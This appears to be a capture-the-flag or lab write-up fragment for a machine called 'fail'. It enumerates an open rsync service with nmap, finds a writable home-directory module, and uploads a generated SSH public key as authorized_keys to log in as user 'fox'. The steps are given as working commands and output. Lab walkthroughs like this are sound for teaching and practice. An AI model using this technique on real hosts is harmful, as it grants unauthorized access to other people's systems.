# 2 :873 rsync

```
$ nmap -sV --script "rsync-list-modules" -p 873 192.168.122.126
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-23 18:59 PDT
Nmap scan report for 192.168.122.126
Host is up (0.072s latency).

PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
| rsync-list-modules:
|_  fox                 fox home

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.76 seconds

$ rsync 192.168.122.126::fox
drwxr-xr-x          4,096 2021/01/21 06:21:59 .
lrwxrwxrwx              9 2020/12/03 12:22:42 .bash_history
-rw-r--r--            220 2019/04/17 21:12:36 .bash_logout
-rw-r--r--          3,526 2019/04/17 21:12:36 .bashrc
-rw-r--r--            807 2019/04/17 21:12:36 .profile

# we can write to it; time to ssh in

# on kali
$ ssh-keygen -f id_rsa
$ mkdir .ssh
$ cp id_rsa.pub .ssh/authorized_keys

# transfer .ssh over to target
$ rsync -r ./.ssh 192.168.122.126::fox/

# success
$ ssh -i id_rsa fox@192.168.122.126
$ whoami;id;hostname;uname -a
fox
uid=1000(fox) gid=1001(fox) groups=1001(fox),1000(fail2ban)
fail
Linux fail 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64 GNU/Linux
```
